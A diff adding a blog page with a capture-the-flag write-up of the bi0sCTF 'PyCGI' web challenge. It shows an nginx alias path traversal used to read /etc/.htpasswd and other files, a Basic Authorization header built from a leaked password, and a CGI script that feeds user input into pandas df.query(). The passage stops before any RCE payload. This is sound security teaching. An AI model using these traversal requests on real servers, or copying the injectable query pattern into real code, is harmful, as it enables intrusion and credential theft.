@@ -1,0 +1,426 @@
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22></text></svg>"><meta name="generator" content="Astro v5.13.9"><!-- Canonical URL --><link rel="canonical" href="https://j3seer.github.io/blog/03-pycgi_bi0ctf/"><!-- Primary Meta Tags --><title>PyCGI - bi0sCTF Writeup | j3seer</title><meta name="title" content="PyCGI - bi0sCTF Writeup | j3seer"><meta name="description" content="Writeup for a challenge from bi0sCTF"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://j3seer.github.io/blog/03-pycgi_bi0ctf/"><meta property="og:title" content="PyCGI - bi0sCTF Writeup | j3seer"><meta property="og:description" content="Writeup for a challenge from bi0sCTF"><meta property="og:image" content="https://j3seer.github.io/astro-micro.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://j3seer.github.io/blog/03-pycgi_bi0ctf/"><meta property="twitter:title" content="PyCGI - bi0sCTF Writeup | j3seer"><meta property="twitter:description" content="Writeup for a challenge from bi0sCTF"><meta property="twitter:image" content="https://j3seer.github.io/astro-micro.jpg"><!-- PageFind --><link href="/pagefind/pagefind-ui.css" rel="stylesheet"><script src="/pagefind/pagefind-ui.js"></script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="animate"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.B3vRBseb.js"></script><script>
+  function init() {
+    preloadTheme();
+    onScroll();
+    animate();
+    updateThemeButtons();
+    addCopyCodeButtons();
+    setGiscusTheme();
+
+    const backToTop = document.getElementById("back-to-top");
+    backToTop?.addEventListener("click", (event) => scrollToTop(event));
+
+    const backToPrev = document.getElementById("back-to-prev");
+    backToPrev?.addEventListener("click", () => window.history.back());
+
+    const lightThemeButton = document.getElementById("light-theme-button");
+    lightThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "light");
+      toggleTheme(false);
+      updateThemeButtons();
+    });
+
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    darkThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "dark");
+      toggleTheme(true);
+      updateThemeButtons();
+    });
+
+    const systemThemeButton = document.getElementById("system-theme-button");
+    systemThemeButton?.addEventListener("click", () => {
+      localStorage.setItem("theme", "system");
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+      updateThemeButtons();
+    });
+
+    window
+      .matchMedia("(prefers-color-scheme: dark)")
+      .addEventListener("change", (event) => {
+        if (localStorage.theme === "system") {
+          toggleTheme(event.matches);
+        }
+      });
+
+    document.addEventListener("scroll", onScroll);
+  }
+
+  function updateThemeButtons() {
+    const theme = localStorage.getItem("theme");
+    const lightThemeButton = document.getElementById("light-theme-button");
+    const darkThemeButton = document.getElementById("dark-theme-button");
+    const systemThemeButton = document.getElementById("system-theme-button");
+
+    function removeActiveButtonTheme(button) {
+      button?.classList.remove("bg-black/5");
+      button?.classList.remove("dark:bg-white/5");
+    }
+
+    function addActiveButtonTheme(button) {
+      button?.classList.add("bg-black/5");
+      button?.classList.add("dark:bg-white/5");
+    }
+
+    removeActiveButtonTheme(lightThemeButton);
+    removeActiveButtonTheme(darkThemeButton);
+    removeActiveButtonTheme(systemThemeButton);
+
+    if (theme === "light") {
+      addActiveButtonTheme(lightThemeButton);
+    } else if (theme === "dark") {
+      addActiveButtonTheme(darkThemeButton);
+    } else {
+      addActiveButtonTheme(systemThemeButton);
+    }
+  }
+
+  function animate() {
+    const animateElements = document.querySelectorAll(".animate");
+
+    animateElements.forEach((element, index) => {
+      setTimeout(() => {
+        element.classList.add("show");
+      }, index * 100);
+    });
+  }
+
+  function onScroll() {
+    if (window.scrollY > 0) {
+      document.documentElement.classList.add("scrolled");
+    } else {
+      document.documentElement.classList.remove("scrolled");
+    }
+  }
+
+  function scrollToTop(event) {
+    event.preventDefault();
+    window.scrollTo({
+      top: 0,
+      behavior: "smooth",
+    });
+  }
+
+  function toggleTheme(dark) {
+    const css = document.createElement("style");
+
+    css.appendChild(
+      document.createTextNode(
+        `* {
+             -webkit-transition: none !important;
+             -moz-transition: none !important;
+             -o-transition: none !important;
+             -ms-transition: none !important;
+             transition: none !important;
+          }
+        `,
+      ),
+    );
+
+    document.head.appendChild(css);
+
+    if (dark) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+
+    window.getComputedStyle(css).opacity;
+    document.head.removeChild(css);
+
+    setGiscusTheme();
+  }
+
+  function preloadTheme() {
+    const userTheme = localStorage.theme;
+
+    if (userTheme === "light" || userTheme === "dark") {
+      toggleTheme(userTheme === "dark");
+    } else {
+      toggleTheme(window.matchMedia("(prefers-color-scheme: dark)").matches);
+    }
+  }
+
+  function addCopyCodeButtons() {
+    let copyButtonLabel = "📋";
+    let codeBlocks = Array.from(document.querySelectorAll("pre"));
+
+    async function copyCode(codeBlock, copyButton) {
+      const codeText = codeBlock.innerText;
+      const buttonText = copyButton.innerText;
+      const textToCopy = codeText.replace(buttonText, "");
+
+      await navigator.clipboard.writeText(textToCopy);
+      copyButton.innerText = "✅";
+
+      setTimeout(() => {
+        copyButton.innerText = copyButtonLabel;
+      }, 2000);
+    }
+
+    for (let codeBlock of codeBlocks) {
+      const wrapper = document.createElement("div");
+      wrapper.style.position = "relative";
+
+      const copyButton = document.createElement("button");
+      copyButton.innerText = copyButtonLabel;
+      copyButton.classList = "copy-code";
+
+      codeBlock.setAttribute("tabindex", "0");
+      codeBlock.appendChild(copyButton);
+
+      codeBlock.parentNode.insertBefore(wrapper, codeBlock);
+      wrapper.appendChild(codeBlock);
+
+      copyButton?.addEventListener("click", async () => {
+        await copyCode(codeBlock, copyButton);
+      });
+    }
+  }
+
+  const setGiscusTheme = () => {
+    const giscus = document.querySelector(".giscus-frame");
+
+    const isDark = document.documentElement.classList.contains("dark");
+
+    if (giscus) {
+      const url = new URL(giscus.src);
+      url.searchParams.set("theme", isDark ? "dark" : "light");
+      giscus.src = url.toString();
+    }
+  };
+
+  document.addEventListener("DOMContentLoaded", () => init());
+  document.addEventListener("astro:after-swap", () => init());
+  preloadTheme();
+</script><link rel="stylesheet" href="/_astro/about.BEDs3EvQ.css"></head> <body> <noscript> <style>
+        .animate{
+          opacity:1;
+          translate: var(--tw-translate-x) calc(var(--spacing) * 0);
+        }
+      </style> </noscript> <header data-astro-transition-persist="astro-l7r54iwe-1"> <div class="mx-auto max-w-300 px-5"> <div class="flex flex-wrap justify-between gap-y-2"> <a href="/" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out">  <div class="flex items-center gap-2 font-semibold"> <img src="/logo.png" alt="Logo" class="size-6 object-contain"> <span>j3seer</span> </div>  </a> <nav class="flex items-center gap-4 text-sm"> <a href="/blog" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]">  <span>
+Blog
+</span>  </a>  ~  <a href="/cves" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]">  <span>
+CVEs
+</span>  </a>  ~  <a href="/about" target="_self" class="inline-block decoration-black/30 dark:decoration-white/30 hover:decoration-black/50 focus-visible:decoration-black/50 dark:hover:decoration-white/50 dark:focus-visible:decoration-white/50 text-current hover:text-black focus-visible:text-black dark:hover:text-white dark:focus-visible:text-white transition-colors duration-300 ease-in-out underline underline-offset-[3px]">  <span>
+About
+</span>  </a> <button id="magnifying-glass" aria-label="Search" class="flex items-center rounded-sm border border-black/15 bg-neutral-100 px-2 py-1 text-xs transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:bg-neutral-900 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg height="16" stroke-linejoin="round" viewBox="0 0 16 16" width="16" style="color: currentcolor;"><path fill-rule="evenodd" clip-rule="evenodd" d="M3.5 7C3.5 5.067 5.067 3.5 7 3.5C8.933 3.5 10.5 5.067 10.5 7C10.5 7.88461 10.1718 8.69256 9.63058 9.30876L9.30876 9.63058C8.69256 10.1718 7.88461 10.5 7 10.5C5.067 10.5 3.5 8.933 3.5 7ZM9.96544 11.0261C9.13578 11.6382 8.11014 12 7 12C4.23858 12 2 9.76142 2 7C2 4.23858 4.23858 2 7 2C9.76142 2 12 4.23858 12 7C12 8.11014 11.6382 9.13578 11.0261 9.96544L14.0303 12.9697L14.5607 13.5L13.5 14.5607L12.9697 14.0303L9.96544 11.0261Z" fill="currentColor"></path></svg>
+&nbsp;Search
+</button> </nav> </div> </div> </header> <main>  <div class="mx-auto max-w-300 px-5"> <div class="animate"> <a href="/blog" class="not-prose group relative flex w-fit flex-nowrap rounded-sm border border-black/15 py-1.5 pl-7 pr-3 transition-colors duration-300 ease-in-out hover:bg-black/5 hover:text-black focus-visible:bg-black/5 focus-visible:text-black dark:border-white/20 dark:hover:bg-white/5 dark:hover:text-white dark:focus-visible:bg-white/5 dark:focus-visible:text-white"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="absolute left-2 top-1/2 size-4 -translate-y-1/2 fill-none stroke-current stroke-2"> <line x1="5" y1="12" x2="19" y2="12" class="translate-x-2 scale-x-0 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-hover:scale-x-100 group-focus-visible:translate-x-0 group-focus-visible:scale-x-100"></line> <polyline points="12 5 5 12 12 19" class="translate-x-1 transition-transform duration-300 ease-in-out group-hover:translate-x-0 group-focus-visible:translate-x-0"></polyline> </svg> <div class="text-sm"> Back to blog </div> </a> </div> <div class="my-10 space-y-1"> <div class="animate flex items-center gap-1.5"> <div class="font-base text-sm"> <time datetime="2023-01-23T00:00:00.000Z"> January 23, 2023 </time> </div>
+&bull;
+<div class="font-base text-sm"> 5 min read </div> </div> <h1 class="animate text-3xl font-semibold text-black dark:text-white"> PyCGI - bi0sCTF Writeup </h1>  </div> <details open class="animate group rounded-lg border border-black/15 my-5 dark:border-white/20"> <summary class="cursor-pointer rounded-t-lg px-3 py-1.5 font-medium transition-colors group-open:bg-black/5 hover:bg-black/5 dark:group-open:bg-white/5 hover:dark:bg-white/5">Table of Contents</summary> <nav> <ul class="py-3">  </ul> </nav> </details><article class="animate"> <p>This challenge was about python CGI scripts, where instead of having regular .cgi scripts, python is used to run them which makes it easier to write. Combined with an RCE in pandas’s df.query() function.</p>
+<h3 id="analysis">Analysis</h3>
+<p>This challenge required many steps but they were very well staged in a way that wasn’t guessy. I admit tho at first we only got the nginx.conf file which doesn’t really give us much, but then we were given the Dockerfile and that made it much easier to analyse.</p>
+<p>So let’s start with the nginx.conf</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="nginx"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">user </span><span style="color:var(--astro-code-foreground)">root;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">worker_processes </span><span style="color:var(--astro-code-token-constant)"> 16</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">events</span><span style="color:var(--astro-code-foreground)"> {</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    worker_connections </span><span style="color:var(--astro-code-token-constant)"> 1024</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">http</span><span style="color:var(--astro-code-foreground)"> {</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    include </span><span style="color:var(--astro-code-foreground)">      mime.types;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    default_type </span><span style="color:var(--astro-code-foreground)"> application/octet-stream;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    sendfile </span><span style="color:var(--astro-code-token-constant)">       on</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    keepalive_timeout </span><span style="color:var(--astro-code-token-constant)"> 65</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    server</span><span style="color:var(--astro-code-foreground)"> {</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        listen </span><span style="color:var(--astro-code-token-constant)">      8000</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        server_name </span><span style="color:var(--astro-code-foreground)"> localhost;</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        </span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        location</span><span style="color:var(--astro-code-foreground)"> / {</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                autoindex </span><span style="color:var(--astro-code-token-constant)">on</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                root </span><span style="color:var(--astro-code-foreground)">/panda/;</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        }</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        location</span><span style="color:var(--astro-code-foreground)"> /cgi-bin/ {</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                gzip </span><span style="color:var(--astro-code-token-constant)">off</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">                </span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                auth_basic </span><span style="color:var(--astro-code-token-string-expression)">          "Admin Area"</span><span style="color:var(--astro-code-foreground)">;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                auth_basic_user_file </span><span style="color:var(--astro-code-foreground)">/etc/.htpasswd;</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">                </span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                include </span><span style="color:var(--astro-code-foreground)">fastcgi_params;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                fastcgi_pass </span><span style="color:var(--astro-code-foreground)">unix:/var/run/fcgiwrap.socket;</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                fastcgi_param </span><span style="color:var(--astro-code-foreground)">SCRIPT_FILENAME /panda/$fastcgi_script_name;</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        }</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">        location</span><span style="color:var(--astro-code-foreground)"> /static {</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">                alias </span><span style="color:var(--astro-code-foreground)">/static/; </span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">        }</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    }</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">}</span></span></code></pre>
+<p>So we can immidiatly tell there’s a path traversal vulnerability from the last part defining an alias for /static.</p>
+<p>Read more about it here : <a href="https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/">https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/</a></p>
+<p>So first i tried getting the admin password for cgi-bin with <a href="http://instance.chall.bi0s.in:10023/static../etc/.htpasswd">http://instance.chall.bi0s.in:10023/static../etc/.htpasswd</a></p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>admin:$apr1$OJtrtoJK$.OLHDj5RzHnSjcFkOi9ZT/</span></span></code></pre>
+<p>A quick google search and common knowledge hinted me that the hash is not bruteforcable .. and i even tried with common wordlists but no luck.</p>
+<p>Okey so maybe try and read the flag? Well that’s what i was tryin to do after the password until we got the Dockerfile..</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="dockerfile"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">FROM</span><span style="color:var(--astro-code-foreground)"> ubuntu</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">RUN</span><span style="color:var(--astro-code-foreground)"> apt-get -y update &#x26;&#x26; DEBIAN_FRONTEND=</span><span style="color:var(--astro-code-token-string-expression)">"noninteractive"</span><span style="color:var(--astro-code-foreground)"> TZ=</span><span style="color:var(--astro-code-token-string-expression)">"Asia/Kolkata"</span><span style="color:var(--astro-code-foreground)"> apt-get -y -q install nginx apache2-utils spawn-fcgi fcgiwrap python3 python3-pip</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">EXPOSE</span><span style="color:var(--astro-code-foreground)"> 80/tcp</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">RUN</span><span style="color:var(--astro-code-foreground)"> [</span><span style="color:var(--astro-code-token-string-expression)">"pip3"</span><span style="color:var(--astro-code-foreground)">, </span><span style="color:var(--astro-code-token-string-expression)">"install"</span><span style="color:var(--astro-code-foreground)">, </span><span style="color:var(--astro-code-token-string-expression)">"pandas"</span><span style="color:var(--astro-code-foreground)">]</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">COPY</span><span style="color:var(--astro-code-foreground)"> docker-entrypoint.sh /</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">RUN</span><span style="color:var(--astro-code-foreground)"> [</span><span style="color:var(--astro-code-token-string-expression)">"chmod"</span><span style="color:var(--astro-code-foreground)">, </span><span style="color:var(--astro-code-token-string-expression)">"+x"</span><span style="color:var(--astro-code-foreground)">, </span><span style="color:var(--astro-code-token-string-expression)">"/docker-entrypoint.sh"</span><span style="color:var(--astro-code-foreground)">]</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">COPY</span><span style="color:var(--astro-code-foreground)"> flag.txt /</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">COPY</span><span style="color:var(--astro-code-foreground)"> static /static/</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">COPY</span><span style="color:var(--astro-code-foreground)"> config/nginx.conf /etc/nginx/</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">COPY</span><span style="color:var(--astro-code-foreground)"> src/ /panda</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">ENTRYPOINT</span><span style="color:var(--astro-code-foreground)"> [</span><span style="color:var(--astro-code-token-string-expression)">"/docker-entrypoint.sh"</span><span style="color:var(--astro-code-foreground)">]</span></span></code></pre>
+<p>Well there’s no problem right? the flag is at /flag.txt?? well yeah that’s again what i thought for a while until i tried getting the docker-entrypoint.sh file with path traversal.</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:var(--astro-code-token-comment)">#!/bin/sh</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">export</span><span style="color:var(--astro-code-foreground)"> PYTHONDONTWRITEBYTECODE</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)">1</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">mv</span><span style="color:var(--astro-code-token-string)"> flag.txt</span><span style="color:var(--astro-code-foreground)"> $(</span><span style="color:var(--astro-code-token-function)">head</span><span style="color:var(--astro-code-token-string)"> /dev/urandom</span><span style="color:var(--astro-code-token-keyword)"> |</span><span style="color:var(--astro-code-token-function)"> shasum</span><span style="color:var(--astro-code-token-keyword)"> |</span><span style="color:var(--astro-code-token-function)"> cut</span><span style="color:var(--astro-code-token-string)"> -d</span><span style="color:var(--astro-code-token-string-expression)">' '</span><span style="color:var(--astro-code-token-string)"> -f1</span><span style="color:var(--astro-code-foreground)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">htpasswd</span><span style="color:var(--astro-code-token-string)"> -mbc</span><span style="color:var(--astro-code-token-string)"> /etc/.htpasswd</span><span style="color:var(--astro-code-token-string)"> admin</span><span style="color:var(--astro-code-token-string)"> Â­</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">spawn-fcgi</span><span style="color:var(--astro-code-token-string)"> -s</span><span style="color:var(--astro-code-token-string)"> /var/run/fcgiwrap.socket</span><span style="color:var(--astro-code-token-string)"> -M</span><span style="color:var(--astro-code-token-constant)"> 766</span><span style="color:var(--astro-code-token-string)"> /usr/sbin/fcgiwrap</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">/usr/sbin/nginx</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">while</span><span style="color:var(--astro-code-token-function)"> true</span><span style="color:var(--astro-code-foreground)">; </span><span style="color:var(--astro-code-token-keyword)">do</span><span style="color:var(--astro-code-token-function)"> sleep</span><span style="color:var(--astro-code-token-constant)"> 1</span><span style="color:var(--astro-code-foreground)">; </span><span style="color:var(--astro-code-token-keyword)">done</span></span></code></pre>
+<p>We can see an interesting command for the admin password ‘htpasswd’ , i wasn’t very aware of what -mbc does.</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:var(--astro-code-token-function)">htpasswd</span><span style="color:var(--astro-code-token-string)"> -mbc</span><span style="color:var(--astro-code-token-string)"> /etc/.htpasswd</span><span style="color:var(--astro-code-token-string)"> admin</span><span style="color:var(--astro-code-token-string)"> Â­</span></span></code></pre>
+<p>So after checking the man page, we notice the random Â­ char at the end? well turns out thats the password, but it was using an invisible char u can’t just copy and paste to login so we can use the base64 encoded Authorization for login. Let’s try it,</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Authorization: Basic YWRtaW46wq0=</span></span></code></pre>
+<p>and bingo! we got a different output, <code>403 forbidden</code> ??</p>
+<p>Well turns out that was just an error message because we can’t simply do some directory listing on the cgi-bin so maybe we can get something else? maybe some scripts inside it?</p>
+<p>During the exploring in the app there was a templates directory with a HTML flask template that has a form for searching of currency, but it doesn’t work because it’s pointing towards search_currency.py which doesn’t exist!! but maybe it exists in cgi-bin?</p>
+<p>Turns out yep! Hence the challenge name, PyCGI , python based cgi scripts</p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="579" height="612" src="/_astro/pycgi1.C8Vpan7-_Z2bTWzO.webp" ></p>
+<p>Read more about them here : <a href="https://linuxhint.com/python-cgi-script/">https://linuxhint.com/python-cgi-script/</a></p>
+<p>With the script being in cgi-bin and us being admin we can try and execute it with <code>/cgi-bin/search_currency.py?currency_name=</code></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="599" height="612" src="/_astro/pycgi3.B2hDyIe-_Z1SOK5z.webp" ></p>
+<p>Okey now what? Well remember the path traversal vulnerability ? let’s try and use it to get the python script code!!</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:var(--astro-code-token-comment)">#!/usr/bin/python3</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-foreground)"> server </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-foreground)"> Server</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-foreground)"> pandas </span><span style="color:var(--astro-code-token-keyword)">as</span><span style="color:var(--astro-code-foreground)"> pd</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">try</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    df </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> pd</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">read_csv</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"../database/currency-rates.csv"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    server </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> Server</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    server</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">set_header</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"Content-Type"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-string-expression)">"text/html"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    params </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> server</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">get_params</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">    assert</span><span style="color:var(--astro-code-token-string-expression)"> "currency_name"</span><span style="color:var(--astro-code-token-keyword)"> in</span><span style="color:var(--astro-code-foreground)"> params</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    currency_code </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> params</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-token-string-expression)">"currency_name"</span><span style="color:var(--astro-code-token-punctuation)">]</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    results </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-foreground)"> df</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">query</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"currency == '</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">currency_code</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">'"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    server</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">add_body</span><span style="color:var(--astro-code-token-punctuation)">(results.</span><span style="color:var(--astro-code-token-function)">to_html</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
+<span class="line"><span style="color:var(--astro-code-foreground)">    server</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">send_response</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">except</span><span style="color:var(--astro-code-token-constant)"> Exception</span><span style="color:var(--astro-code-token-keyword)"> as</span><span style="color:var(--astro-code-foreground)"> e</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">    print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"Content-Type: text/html"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">    print</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">    print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"Exception"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
+<span class="line"><span style="color:var(--astro-code-token-function)">    print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(e))</span></span></code></pre>
+<p>Nice! we now have some context, let’s try and extract <code>server.py</code> aswell ( refrenced in the import section of the code)</p>
+<pre class="astro-code css-variables" style="background-color:var(--astro-code-background);color:var(--astro-code-foreground); overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-foreground)"> os </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-foreground)"> environ</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:var(--astro-code-token-keyword)">class</span><span style="color:var(--astro-code-token-function)"> Server</span><span style="color:var(--astro-code-foreground)">:</span></span>
